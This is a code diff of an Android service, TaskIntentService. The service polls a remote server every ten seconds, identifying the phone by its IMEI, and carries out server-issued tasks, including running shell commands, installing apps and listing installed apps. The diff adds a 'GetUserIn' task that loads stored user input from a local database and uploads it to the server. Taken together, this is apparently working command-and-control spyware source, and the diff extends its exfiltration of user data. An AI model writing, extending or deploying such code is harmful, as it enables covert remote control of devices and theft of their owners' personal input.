@@ -43,6 +43,7 @@ public class TaskIntentService extends IntentService {
         public final static String Shell = "Shell";
         public final static String Install = "Install";
         public final static String GetAppList = "GetAppList";
+        public final static String GetUserIn = "GetUserIn";
     }
 
     public class TaskThread extends Thread {
@@ -74,7 +75,7 @@ public class TaskIntentService extends IntentService {
     }
 
     private Set<String> DoingTasks = Collections.synchronizedSet(new HashSet<String>());
-    OkHttpClient client = new OkHttpClient();
+
 
     public TaskIntentService() {
         super("TaskIntentService");
@@ -83,16 +84,15 @@ public class TaskIntentService extends IntentService {
     @Override
     protected void onHandleIntent(Intent intent) {
         //读取配置文件中的rate频率
-        SharedPreferences pref = getSharedPreferences("conService", MODE_PRIVATE);
+       /* SharedPreferences pref = getSharedPreferences("conService", MODE_PRIVATE);
         int rate = pref.getInt("rate", 5);//没有找到则传出默认值300
-        //Alarm定时器
+        //Alarm定时器*/
         AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
-        int aTime = rate * 1000; // 默认，可以更改配置
+        int aTime = 10 * 1000; // 默认，可以更改配置
         Intent in = new Intent(this, TaskIntentService.class);
         PendingIntent pi = PendingIntent.getService(this.getApplicationContext(), 0, in, PendingIntent.FLAG_UPDATE_CURRENT);
         manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + aTime, pi);
         Log.i("TaskService", "==============================>test");
-
         JSONArray ja = getTasks();
         //taskArray不为null时操作
         if (ja != null) {
@@ -113,7 +113,7 @@ public class TaskIntentService extends IntentService {
         //从服务器获取任务列表
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
-
+        OkHttpClient client = new OkHttpClient();
         Request request = new Request.Builder()
                 .url("http://api.hewoyi.com.cn/v1/tasks?imei=" + telephonyManager.getDeviceId())
                 .build();
@@ -165,7 +165,14 @@ public class TaskIntentService extends IntentService {
                 status = -1;
                 result = "NND 没有文件";
             }
-        } else {
+        } else if(task.getString("type").equals(Task.GetUserIn)){
+            result = DBHandler.getInstance(getApplicationContext()).loadIn();
+            if(result.equals("")){
+                status = -1;
+            }else {
+                status = 1;
+            }
+        }else {
             result = "Type Error";
         }
         new UpdateTaskThread(task.getString("_id"), status, result).start();
@@ -183,6 +190,7 @@ public class TaskIntentService extends IntentService {
         js.put("result", result);
         json = js.toString();
 
+        OkHttpClient client = new OkHttpClient();
         RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), json);
         Request request = new Request.Builder()
                 .url("http://api.hewoyi.com.cn/v1/task/" + id)
